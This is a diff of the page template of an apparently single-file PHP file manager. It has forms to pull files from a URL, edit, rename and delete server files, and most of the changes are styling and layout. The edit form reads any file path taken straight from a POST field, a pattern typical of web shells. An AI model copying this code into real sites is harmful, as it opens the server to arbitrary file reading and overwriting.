@@ -145,7 +145,7 @@ $dirArray = array_filter(explode(DIRECTORY_SEPARATOR, $displayDir), function($va
     <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
     <style>
         body {
-            background-color: #f5f5f5;
+            background-color: #e3f2fd; /* Biru muda */
         }
         .container {
             background-color: #ffffff;
@@ -153,27 +153,13 @@ $dirArray = array_filter(explode(DIRECTORY_SEPARATOR, $displayDir), function($va
             border-radius: 8px;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
         }
-        .btn-link {
-            color: #e91e63;
-        }
-        .btn-link:hover {
-            color: #c2185b;
-        }
         .btn-primary {
-            background-color: #e91e63;
+            background-color: #e91e63; /* Pink */
             border-color: #e91e63;
         }
         .btn-primary:hover {
-            background-color: #c2185b;
+            background-color: #c2185b; /* Pink gelap */
             border-color: #c2185b;
-        }
-        .btn-secondary {
-            background-color: #9e9e9e;
-            border-color: #9e9e9e;
-        }
-        .btn-secondary:hover {
-            background-color: #757575;
-            border-color: #757575;
         }
         .btn-danger {
             background-color: #f44336;
@@ -232,72 +218,57 @@ $dirArray = array_filter(explode(DIRECTORY_SEPARATOR, $displayDir), function($va
                 <form method="post">
                     <div class="form-group">
                         <label for="url">File URL</label>
-                        
                                                 <input type="text" id="url" name="url" class="form-control" placeholder="Enter file URL" required>
                     </div>
-                    <div class="form-group">
-                        <label for="dir">Save Directory</label>
-                        <input type="text" id="dir" name="dir" class="form-control" value="<?php echo htmlspecialchars($displayDir); ?>" required>
-                    </div>
+                    <input type="hidden" name="dir" value="<?php echo htmlspecialchars($displayDir); ?>">
                     <button type="submit" class="btn btn-primary">Upload</button>
                 </form>
             </div>
 
             <!-- Form untuk edit file -->
-            <div class="mt-4">
-                <h2>Edit File</h2>
-                <?php if (isset($_POST['edit'])): ?>
-                    <?php $fileToEdit = htmlspecialchars($_POST['edit']); ?>
+            <?php if (isset($_POST['edit'])): ?>
+                <div class="mt-4">
+                    <h2>Edit File</h2>
                     <form method="post">
-                        <input type="hidden" name="edit" value="<?php echo $fileToEdit; ?>">
                         <div class="form-group">
                             <label for="content">File Content</label>
-                            <textarea id="content" name="content" class="form-control" rows="10"><?php echo htmlspecialchars(file_get_contents($fileToEdit)); ?></textarea>
+                            <textarea id="content" name="content" class="form-control" rows="10" required><?php echo htmlspecialchars(file_get_contents($_POST['edit'])); ?></textarea>
                         </div>
+                        <input type="hidden" name="edit" value="<?php echo htmlspecialchars($_POST['edit']); ?>">
                         <button type="submit" class="btn btn-primary">Save Changes</button>
                     </form>
-                <?php endif; ?>
-            </div>
+                </div>
+            <?php endif; ?>
 
             <!-- Form untuk rename file -->
-            <div class="mt-4">
+            <div id="rename-form" class="mt-4" style="display:none;">
                 <h2>Rename File</h2>
-                <div id="rename-form" style="display:none;">
-                    <form method="post">
-                        <input type="hidden" name="rename" value="<?php echo isset($fileToRename) ? htmlspecialchars($fileToRename) : ''; ?>">
-                        <div class="form-group">
-                            <label for="newName">New Name</label>
-                            <input type="text" id="newName" name="newName" class="form-control" required>
-                        </div>
-                        <button type="submit" class="btn btn-primary">Rename</button>
-                    </form>
-                </div>
-            </div>
-
-            <!-- Form untuk upload file dari URL -->
-            <div class="mt-4">
-                <h2>Upload File from URL</h2>
                 <form method="post">
                     <div class="form-group">
-                        <label for="url">File URL</label>
-                        <input type="text" id="url" name="url" class="form-control" placeholder="Enter file URL" required>
+                        <label for="newName">New File Name</label>
+                        <input type="text" id="newName" name="newName" class="form-control" placeholder="Enter new file name" required>
                     </div>
-                    <div class="form-group">
-                        <label for="dir">Save Directory</label>
-                        <input type="text" id="dir" name="dir" class="form-control" value="<?php echo htmlspecialchars($displayDir); ?>" required>
-                    </div>
-                    <button type="submit" class="btn btn-primary">Upload</button>
+                    <input type="hidden" name="rename" value="<?php echo htmlspecialchars($_POST['rename']); ?>">
+                    <button type="submit" class="btn btn-primary">Rename</button>
                 </form>
             </div>
 
-            <!-- Script untuk menangani tombol rename -->
-            <script>
-                function showRenameForm(filePath) {
-                    document.getElementById('rename-form').style.display = 'block';
-                    document.querySelector('input[name="rename"]').value = filePath;
-                }
-            </script>
+            <!-- Form untuk mengedit atau menghapus file -->
+            <div class="mt-4">
+                <h2>File Actions</h2>
+                <!-- Form untuk delete file -->
+                <form method="post" style="display:inline;">
+                    <input type="hidden" name="delete" value="<?php echo htmlspecialchars($file); ?>">
+                    <button type="submit" class="btn btn-danger">Delete File</button>
+                </form>
+            </div>
         <?php endif; ?>
     </div>
+
+    <!-- Bootstrap JS dan dependencies -->
+    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.3/dist/umd/popper.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
 </body>
 </html>
+
